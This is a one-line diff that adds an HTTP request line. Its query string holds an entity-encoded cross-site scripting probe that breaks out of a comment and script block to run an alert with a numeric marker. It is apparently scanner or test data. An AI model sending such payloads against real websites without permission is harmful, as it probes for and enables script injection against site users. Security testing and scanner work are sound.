@@ -1,0 +1,1 @@
+GET /?--&gt;&lt;/script&gt;&lt;script&gt;alert(51494)&lt;/script&gt; HTTP/1.1
